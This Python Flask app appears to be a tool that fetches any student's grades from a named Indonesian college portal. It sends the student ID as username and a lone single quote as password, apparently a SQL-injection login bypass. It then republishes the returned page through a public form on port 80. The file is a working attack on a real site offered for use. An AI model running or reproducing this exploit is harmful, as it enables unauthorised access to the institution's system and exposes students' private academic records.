import requests
from flask import Flask, request

app = Flask(__name__)

@app.route("/stmiknim")
def StmikNIM():
    if "nim" in request.args:
        nim = request.args["nim"].strip().replace("_", "").replace("-", "").replace(" ", "")
        try:
            test = int(nim)
            if len(nim) != 9: test()
            print("[STMIK LOGINMHS] NIM >>> %s" % nim)
            mydata = requests.post("http://www.stmikpontianak.ac.id/pages/menunilai.php", data={"username":nim, "password":"'", "Login":"Masuk"}).text
            mydata = mydata.replace("<style media=\"all\" type=\"text/css\">@import \"css/all.css\";</style>", "<link rel=\"stylesheet\" href=\"http://www.stmikpontianak.ac.id/pages/css/all.css\">")
            mydata = mydata.replace("<a href=\"logout.php\"><b>Logout", "")
            mydata = mydata.replace("src=\"img/bg-footer.gif\"", "src=\"http://www.stmikpontianak.ac.id/pages/img/bg-footer.gif\"")
            mydata = mydata.replace("<div id=\"header\"></div>", '<div id="header"><h3><center>Perlu diketahui, halaman web ini menyalin 100% persis dengan yang aslinya, hanya saja beberapa hyperlink saya hilangkan.</center></h3></div>')
            return mydata
        except:
            pass
    return "<form><label>NIM: </label><input type='text' name='nim'><input type='submit' value='Check'></form>"

def main():
    app.run(port=80)


if __name__ == "__main__": main()
